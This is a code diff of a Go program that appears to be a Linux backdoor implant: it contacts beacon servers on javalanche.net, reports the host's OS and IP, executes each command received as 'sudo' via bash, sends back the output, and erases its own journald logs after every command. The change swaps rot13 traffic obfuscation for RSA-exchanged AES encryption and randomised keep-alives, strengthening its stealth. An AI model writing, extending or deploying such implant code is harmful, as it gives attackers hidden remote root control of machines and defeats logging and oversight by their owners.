@@ -7,16 +7,20 @@ package main
 
 import (
 	"bufio"
+	"crypto/rand"
 	"fmt"
-	"math/rand"
+	"linuxBinary/encryption/aes"
+	"linuxBinary/encryption/rsa"
+	"math/big"
 	"net"
 	"os/exec"
+	"strconv"
 	"strings"
 	"time"
 )
 
 func resolveBeaconIPAddr() string {
-	beacons := []string{"beacon1.javalanche.net", "beacon2.javalanche.net"}
+	beacons := []string{"beacon1.javalanche.net", "beacon2.javalanche.net", "beacon3.javalanche.net"}
 
 	// Resolve ip's of of the beacons
 	for _, element := range beacons {
@@ -27,7 +31,7 @@ func resolveBeaconIPAddr() string {
 				conn, err := net.DialTimeout("tcp", (ip.String() + ":80"), 10*time.Second)
 				if err == nil {
 					defer conn.Close()
-					fmt.Fprintf(conn, "GET / HTTP/1.1\n")
+					fmt.Fprint(conn, "GET / HTTP/1.1\n")
 					reader := bufio.NewReader(conn)
 					message1, err1 := reader.ReadString('\n')
 					message2, err2 := reader.ReadString('\n')
@@ -55,27 +59,20 @@ func resolveBeaconIPAddr() string {
 	return "0"
 }
 
-func rot13Encrypt(input string) string {
-	var result strings.Builder
-	for _, char := range input {
-		switch {
-		case 'a' <= char && char <= 'z':
-			result.WriteRune((char-'a'+13)%26 + 'a')
-		case 'A' <= char && char <= 'Z':
-			result.WriteRune((char-'A'+13)%26 + 'A')
-		default:
-			result.WriteRune(char)
-		}
-	}
-	return result.String()
-}
+func sendKeepAlive(socket net.Conn, aesSubKeys []string) {
+	// Encrypt the packet with AES
+	packet := "KEEP_ALIVE"
+	packet = aes.AESEncrypt(packet, aesSubKeys)
+	packet = strconv.Itoa(len(aes.DecodeUTF8String(packet))) + "\n" + packet + "\n"
 
-func sendKeepAlive(socket net.Conn) {
-	packet := "HTTP/1.1 200 OK\r\nContent-Length: 11\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n" + rot13Encrypt("KEEP_ALIVE") + "\r\n"
+	// Sleep a random time between 30 and 90 seconds
 	for {
-		randomTime := rand.Intn(60) + 30
-		time.Sleep(time.Duration(randomTime) * time.Second)
-		fmt.Fprintf(socket, packet)
+		randomTime, _ := rand.Int(rand.Reader, big.NewInt(int64(60)))
+		randomTimeInt := randomTime.Int64() + 30
+		time.Sleep(time.Duration(randomTimeInt) * time.Second)
+
+		// Send the KEEP_ALIVE message
+		fmt.Fprint(socket, packet)
 	}
 }
 
@@ -94,52 +91,100 @@ func getServiceName() string {
 	return ""
 }
 
+func readEncryptedMessage(reader *bufio.Reader) (string, error) {
+	// First thing sent is the number of bytes in the upcomming message
+	numBytesToRead, err := reader.ReadString('\n')
+	var messageBuilder strings.Builder
+	numBytesAsInt, _ := strconv.Atoi(strings.TrimSpace(numBytesToRead))
+
+	// Read the number of bytes determined by the previous message
+	for i := 0; i < numBytesAsInt; i++ {
+		byteRead, _ := reader.ReadByte()
+		if byteRead == (byte)(194) || byteRead == (byte)(195) {
+			i--
+		}
+		messageBuilder.WriteByte(byteRead)
+	}
+	serverMessage := messageBuilder.String()
+
+	// Clear out extra \n sitting in buffer
+	reader.ReadByte()
+
+	return serverMessage, err
+}
+
+func genAESKey(length int) string {
+	bytes := make([]byte, length/2)
+	rand.Read(bytes)
+	return fmt.Sprintf("%x", bytes)
+}
+
 func main() {
 	// Resolve IP Address of a Beacon Server
 	serviceName := getServiceName()
 	serverIPAddress := resolveBeaconIPAddr()
 	if serverIPAddress != "0" {
+
 		// Connect to Beacon Server
 		serverConn, err := net.Dial("tcp", (serverIPAddress + ":80"))
 		if err != nil {
 			fmt.Print("Error connecting to server\n")
 		} else {
-			go sendKeepAlive(serverConn)
-			defer serverConn.Close()
 			// First message is the OS of this machine
-			fmt.Fprintf(serverConn, "Linux\n")
+			fmt.Fprint(serverConn, "Linux\n")
 
 			// Get IP Address of this host and send it as the second message
 			hostIPAddr := strings.Split(serverConn.LocalAddr().String(), ":")[0] + "\n"
-			fmt.Fprintf(serverConn, hostIPAddr)
+			fmt.Fprint(serverConn, hostIPAddr)
+
+			// Generate subkeys for AES encryption
+			masterKey := genAESKey(32)
+			aesSubKeys := aes.GenerateRoundKeys(masterKey)
+
+			reader := bufio.NewReader(serverConn)
+
+			n, _ := readEncryptedMessage(reader)
+			e, _ := readEncryptedMessage(reader)
+
+			encryptedAESKey := rsa.RsaEncrypt(n, e, masterKey)
+
+			keyMessage := strconv.Itoa(len(encryptedAESKey)) + "\n" + encryptedAESKey + "\n"
+			fmt.Fprint(serverConn, keyMessage)
+
+			// Start a thread that sends encrypted KEEP_ALIVE messages to the server to keep the socket alive
+			go sendKeepAlive(serverConn, aesSubKeys)
+			defer serverConn.Close()
 
 			// Main while loop to listen and execute commands
-			reader := bufio.NewReader(serverConn)
 			for {
-				message, err := reader.ReadString('\n')
+				serverMessage, err := readEncryptedMessage(reader)
 				if err != nil {
 					break
 				} else {
-					if message != "HTTP/1.1 200 OK\r\n" && !(strings.Contains(message, "Content-Length: ")) && message != "Content-Type: text/plain; charset=utf-8\r\n" && message != "\r\n" {
-						serverMessage := rot13Encrypt(message)
-						if serverMessage != "KEEP_ALIVE\n" {
-							// As long as the message is not a KEEP_ALIVE message or apart of the
-							// HTTP header, execute it as a command
-							cmd := exec.Command("bash", "-c", "sudo "+serverMessage)
-							output, err := cmd.Output()
-							if err != nil {
-								fmt.Println("Error Executing command: ", err)
+					serverMessage = aes.AESDecrypt(serverMessage, aesSubKeys)
+					if serverMessage != "KEEP_ALIVE" {
+						// As long as the message is not a KEEP_ALIVE message, execute it as a command
+						cmd := exec.Command("bash", "-c", "sudo "+serverMessage)
+						output, err := cmd.Output()
+						if err != nil {
+							fmt.Println("Error Executing command: ", err)
 
-								finalOutput := "END_OF_OUTPUT\r\n"
-								fmt.Fprintf(serverConn, rot13Encrypt(finalOutput))
-							} else {
-								finalOutput := string(output) + "END_OF_OUTPUT\r\n"
-								fmt.Fprintf(serverConn, rot13Encrypt(finalOutput))
-							}
-							// Clear logs of our service
-							clearLogs := exec.Command("bash", "-c", "sudo journalctl --rotate --vacuum-size=1B --unit="+serviceName)
-							clearLogs.Run()
+							// If there is an error executing the command, we still want to return an empty output
+							finalOutput := "END_OF_OUTPUT\r\n"
+							cipherText := aes.AESEncrypt(finalOutput, aesSubKeys)
+
+							cipherText = strconv.Itoa(len(aes.DecodeUTF8String(cipherText))) + "\n" + cipherText + "\n"
+							fmt.Fprint(serverConn, cipherText)
+						} else {
+							finalOutput := string(output) + "END_OF_OUTPUT\r\n"
+							cipherText := aes.AESEncrypt(finalOutput, aesSubKeys)
+
+							cipherText = strconv.Itoa(len(aes.DecodeUTF8String(cipherText))) + "\n" + cipherText + "\n"
+							fmt.Fprint(serverConn, cipherText)
 						}
+						// Clear logs of our service
+						clearLogs := exec.Command("bash", "-c", "sudo journalctl --rotate --vacuum-size=1B --unit="+serviceName)
+						clearLogs.Run()
 					}
 				}
 			}
